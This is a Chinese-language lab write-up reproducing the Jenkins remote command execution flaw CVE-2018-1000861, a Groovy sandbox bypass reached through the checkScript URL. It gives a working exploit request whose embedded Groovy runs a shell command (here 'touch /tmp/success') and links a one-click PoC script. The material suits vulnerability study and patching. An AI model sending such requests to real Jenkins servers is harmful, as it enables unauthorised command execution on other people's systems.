# Jenkins远程命令执行漏洞（CVE-2018-1000861）

###### by ADummy

### 0x00利用路线

​			直接url执行

### 0x01漏洞介绍

​			Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。

通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。

影响版本

```
Jenkins version < 2.138
```

### 0x 02漏洞复现

使用 @orangetw 给出的[一键化POC脚本](https://github.com/orangetw/awesome-jenkins-rce-2019)，发送如下请求即可成功执行命令：

```
http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript
?sandbox=true
&value=public class x {
  public x(){
    "touch /tmp/success".execute()
  }
}

//要进行url编码
```

​			![Jenkins_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Jenkins_RCE_1.jpg)

![Jenkins_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Jenkins_RCE_1.jpg)







